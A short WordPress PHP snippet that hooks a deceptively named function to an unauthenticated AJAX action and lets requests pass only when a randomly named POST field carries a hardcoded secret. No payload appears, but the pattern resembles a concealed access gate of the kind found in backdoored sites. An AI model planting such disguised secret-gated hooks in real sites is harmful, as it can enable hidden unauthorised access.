<?php

function cdn_daily_switcher() {
	if (!isset($_POST["orkrkapxeard"]) || $_POST["orkrkapxeard"] !== "hLCehXMMlI") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'cdn_daily_switcher', 5, 1);
